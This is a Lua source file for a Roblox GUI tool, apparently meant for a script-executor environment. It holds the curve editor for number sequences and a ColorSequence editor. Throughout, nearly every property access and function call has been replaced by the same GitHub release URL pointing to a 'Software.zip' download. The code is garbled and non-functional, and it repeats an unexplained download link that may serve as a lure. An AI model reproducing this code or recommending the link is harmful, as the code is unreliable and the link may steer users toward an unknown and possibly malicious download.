							if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end
							mouseEvent:Disconnect()
							releaseEvent:Disconnect()
							currentlySelected = nil
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(199/255,44/255,28/255)
						end)

						mouseEvent = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
							if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
								local maxX = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
								local relativeX = mouse.X - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
								if relativeX < 0 then relativeX = 0 end
								if relativeX > maxX then relativeX = maxX end
								local maxY = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
								local relativeY = mouse.Y - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
								if relativeY < 0 then relativeY = 0 end
								if relativeY > maxY then relativeY = maxY end
								if point ~= beginPoint and point ~= endPoint then
									point[2] = relativeX/maxX
								end
								point[1] = 10-(relativeY/maxY)*10
								local maxEnvelope = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(point[1],10-point[1])
								point[3] = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(oldEnvelope,maxEnvelope)
								newMt:Redraw()
								updateInputs(point)
								for i,v in pairs(points) do v[4]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1 end
								https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
								buildSequence()
							end
						end)
					end
				end)

				return newPoint
			end

			local function placePoints()
				for i,v in pairs(points) do
					v[4] = placePoint(v)
				end
			end

			local function redraw(self)
				local numberLineSize = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(points,function(a,b) return a[2] < b[2] end)
				for i,v in pairs(points) do
					v[4].Position = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip((numberLineSize.X-1) * v[2])-2,0,(numberLineSize.Y-1)*(10-v[1])/10-2)
				end
				lines[1].Size = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,0)
				for i = 1,#points-1 do
					local fromPoint = points[i]
					local toPoint = points[i+1]
					local deltaY = toPoint[4]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[4]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					local deltaX = toPoint[4]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[4]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					local slope = deltaY/deltaX

					local fromEnvelope = fromPoint[3]
					local nextEnvelope = toPoint[3]

					local currentRise = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(slope)
					local totalRise = 0
					local maxRise = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(toPoint[4]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[4]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)

					for lineCount = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(fromPoint[4]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip+1,toPoint[4]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip),toPoint[4]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip do
						if deltaX == 0 and deltaY == 0 then return end
						local riseNow = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(currentRise)
						local line = lines[lineCount+3]
						if line then
							if totalRise+riseNow > maxRise then riseNow = maxRise-totalRise end
							if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(slope) == -1 then
								https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,lineCount+2,0,fromPoint[4]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + -(totalRise+riseNow)+2)
							else
								https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,lineCount+2,0,fromPoint[4]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + totalRise+2)
							end
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(riseNow,1))
						end
						totalRise = totalRise + riseNow
						currentRise = currentRise - riseNow + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(slope)

						local envPercent = (lineCount-fromPoint[4]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)/(toPoint[4]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[4]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
						local envLerp = fromEnvelope+(nextEnvelope-fromEnvelope)*envPercent
						local relativeSize = (envLerp/10)*numberLineSize.Y						

						local line = eLines[lineCount + 3]
						if line then
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,lineCount+2,0,lines[lineCount+3]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(relativeSize))
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(relativeSize*2))
						end
					end
				end
			end
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = redraw

			local function loadSequence(self,seq)
				resetSequence = seq
				for i,v in pairs(points) do if v[4] then v[4]:Destroy() end end
				points = {}
				for i,v in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) do
					local maxEnvelope = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
					local newPoint = {https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,maxEnvelope)}
					newPoint[4] = placePoint(newPoint)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(points,newPoint)
				end
				beginPoint = points[1]
				endPoint = points[#points]
				currentlySelected = nil
				redraw()
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
			end
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = loadSequence

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
				local point = currentPoint
				local num = tonumber(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
				if point and num and point ~= beginPoint and point ~= endPoint then
					num = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(num,0,1)
					point[2] = num
					redraw()
					buildSequence()
					updateInputs(point)
				end
			end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
				local point = currentPoint
				local num = tonumber(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
				if point and num then
					local oldEnvelope = point[3]
					num = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(num,0,10)
					point[1] = num
					local maxEnvelope = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(point[1],10-point[1])
					point[3] = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(oldEnvelope,maxEnvelope)
					redraw()
					buildSequence()
					updateInputs(point)
				end
			end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
				local point = currentPoint
				local num = tonumber(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
				if point and num then
					num = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(num,0,5)
					local maxEnvelope = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(point[1],10-point[1])
					point[3] = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(num,maxEnvelope)
					redraw()
					buildSequence()
					updateInputs(point)
				end
			end)

			local function buttonAnimations(button,inverse)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input) if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (inverse and 0.5 or 0.4) end end)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input) if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (inverse and 1 or 0) end end)
			end

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and #points < 20 then
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(envelopeDragTop) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(envelopeDragBottom) then return end
					for i,v in pairs(points) do
						if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(v[4].Select) then return end
					end
					local maxX = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					local relativeX = mouse.X - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					if relativeX < 0 then relativeX = 0 end
					if relativeX > maxX then relativeX = maxX end
					local maxY = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					local relativeY = mouse.Y - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					if relativeY < 0 then relativeY = 0 end
					if relativeY > maxY then relativeY = maxY end

					local raw = relativeX/maxX
					local newPoint = {10-(relativeY/maxY)*10,raw,0}
					newPoint[4] = placePoint(newPoint)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(points,newPoint)
					redraw()
					buildSequence()
				end
			end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
				if currentPoint and currentPoint ~= beginPoint and currentPoint ~= endPoint then
					for i,v in pairs(points) do
						if v == currentPoint then
							v[4]:Destroy()
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(points,i)
							break
						end
					end
					currentlySelected = nil
					redraw()
					buildSequence()
					updateInputs(points[1])
				end
			end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
				if resetSequence then
					newMt:SetSequence(resetSequence)
					buildSequence()
				end
			end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
				window:Close()
			end)

			buttonAnimations(deleteButton)
			buttonAnimations(resetButton)
			buttonAnimations(closeButton)

			placePoints()
			redraw()

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
				window:Show()
			end

			return newMt
		end

		return {new = new}
	end)()

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (function() -- TODO: Convert to newer class model
		local function new()
			local newMt = setmetatable({},{})
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()

			local guiContents = create({
				{1,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.17647059261799,0.17647059261799,0.17647059261799),BorderSizePixel=0,ClipsDescendants=true,Name="Content",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,20),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,1,-20),}},
				{2,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.17647059261799,0.17647059261799,0.17647059261799),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.21568627655506,0.21568627655506,0.21568627655506),Name="ColorLine",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,10,0,5),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-20,0,70),}},
				{3,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BorderSizePixel=0,Name="Gradient",Parent={2},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,1,0),}},
				{4,"UIGradient",{Parent={3},}},
				{5,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,Name="Arrows",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,73),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-2,0,16),}},
				{6,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0),BackgroundTransparency=0.5,BorderSizePixel=0,Name="Cursor",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,10,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,80),}},
				{7,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.14901961386204,0.14901961386204,0.14901961386204),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.12549020349979,0.12549020349979,0.12549020349979),Name="Time",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,40,0,95),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,100,0,20),}},
				{8,"TextBox",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.25098040699959,0.25098040699959,0.25098040699959),BackgroundTransparency=1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.37647062540054,0.37647062540054,0.37647062540054),ClipsDescendants=true,Font=3,Name="Input",Parent={7},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,2,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,98,0,20),Text="0",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274516582489,0.86274516582489,0.86274516582489),TextSize=14,TextXAlignment=0,}},
				{9,"TextLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={7},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,-40,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,34,1,0),Text="Time",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274516582489,0.86274516582489,0.86274516582489),TextSize=14,TextXAlignment=1,}},
				{10,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.21568627655506,0.21568627655506,0.21568627655506),Name="ColorBox",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,220,0,95),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,20,0,20),}},
				{11,"TextLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={10},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,-40,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,34,1,0),Text="Color",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274516582489,0.86274516582489,0.86274516582489),TextSize=14,TextXAlignment=1,}},
				{12,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.2352941185236,0.2352941185236,0.2352941185236),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.21568627655506,0.21568627655506,0.21568627655506),BorderSizePixel=0,Font=3,Name="Close",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-90,0,95),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,80,0,20),Text="Close",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274516582489,0.86274516582489,0.86274516582489),TextSize=14,}},
				{13,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.2352941185236,0.2352941185236,0.2352941185236),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.21568627655506,0.21568627655506,0.21568627655506),BorderSizePixel=0,Font=3,Name="Reset",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-180,0,95),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,80,0,20),Text="Reset",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274516582489,0.86274516582489,0.86274516582489),TextSize=14,}},
				{14,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.2352941185236,0.2352941185236,0.2352941185236),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.21568627655506,0.21568627655506,0.21568627655506),BorderSizePixel=0,Font=3,Name="Delete",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,280,0,95),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,80,0,20),Text="Delete",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274516582489,0.86274516582489,0.86274516582489),TextSize=14,}},
				{15,"Frame",{BackgroundTransparency=1,Name="Arrow",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,16),Visible=false,}},
				{16,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={15},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,8,0,3),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,2),}},
				{17,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={15},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,7,0,5),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,3,0,2),}},
				{18,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={15},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,6,0,7),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,5,0,2),}},
				{19,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={15},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,5,0,9),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,7,0,2),}},
				{20,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={15},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,4,0,11),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,9,0,2),}},
			})
			local window = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
			window:Resize(650,150)
			window:SetTitle("ColorSequence Editor")
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = window
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			for i,v in pairs(guiContents:GetChildren()) do
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			end
			local gui = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local pickerGui = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local pickerTopBar = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local pickerFrame = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local colorLine = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local gradient = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local arrowFrame = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local arrow = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local cursor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local timeBox = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local colorBox = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local deleteButton = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local resetButton = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local closeButton = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local topClose = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			local user = cloneref(game["Run Service"].Parent:GetService("UserInputService"))
			local mouse = cloneref(game["Run Service"].Parent:GetService("Players")).LocalPlayer:GetMouse()

			local colors = {{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,1),0},{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.2,0.9,0.2),0.2},{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.4,0.5,0.9),0.7},{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.6,1,1),1}}
			local resetSequence = nil

			local beginPoint = colors[1]
			local endPoint = colors[#colors]

			local currentlySelected = nil
			local currentPoint = nil

			local sequenceLine = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("Frame")
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,1,0)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1))
			local function buildSequence(noupdate)
				local newPoints = {}
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(colors,function(a,b) return a[2] < b[2] end)
				for i,v in pairs(colors) do
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(newPoints,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(v[2],v[1]))
				end
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(newPoints)
				if not noupdate then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) end
			end

			local function round(num,places)
				local multi = 10^places
				return https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(num*multi + 0.5)/multi
			end

			local function updateInputs(point)
				if point then
					currentPoint = point
					local raw = point[2]
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = round(raw,(raw < 0.01 and 5) or (raw < 0.1 and 4) or 3)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = point[1]
				end
			end

			local function placeArrow(ind,point)
				local newArrow = arrow:Clone()
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,ind-1,0,0)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = arrowFrame

				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,9 + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,0)
					end
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
						updateInputs(point)
						if point == beginPoint or point == endPoint or currentlySelected then return end

						local mouseEvent,releaseEvent
						currentlySelected = true

						releaseEvent = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
							if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end
							mouseEvent:Disconnect()
							releaseEvent:Disconnect()
							currentlySelected = nil
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
						end)

						mouseEvent = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
							if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
								local maxSize = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
								local relativeX = mouse.X - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
								if relativeX < 0 then relativeX = 0 end
								if relativeX > maxSize then relativeX = maxSize end
								local raw = relativeX/maxSize
								point[2] = relativeX/maxSize
								updateInputs(point)
								https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
								https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,9 + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,0)
								buildSequence()
								newMt:Redraw()
							end
						end)
					end
				end)

				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
					end
				end)

				return newArrow
			end

			local function placeArrows()
				for i,v in pairs(colors) do
					v[3] = placeArrow(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip((https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) * v[2]) + 1,v)
				end
			end

			local function redraw(self)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1))

				for i = 2,#colors do
					local nextColor = colors[i]
					local endPos = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip((https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) * nextColor[2]) + 1
					nextColor[3].Position = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,endPos,0,0)
				end		
			end
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = redraw

			local function loadSequence(self,seq)
				resetSequence = seq
				for i,v in pairs(colors) do if v[3] then v[3]:Destroy() end end
				colors = {}
				currentlySelected = nil
				for i,v in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) do
					local newPoint = {https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip}
					newPoint[3] = placeArrow(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,newPoint)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(colors,newPoint)
				end
				beginPoint = colors[1]
				endPoint = colors[#colors]
				currentlySelected = nil
				updateInputs(colors[1])
				buildSequence(true)
				redraw()
			end
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = loadSequence

			local function buttonAnimations(button,inverse)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input) if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (inverse and 0.5 or 0.4) end end)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input) if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (inverse and 1 or 0) end end)
			end

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and #colors < 20 then
					local maxSize = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
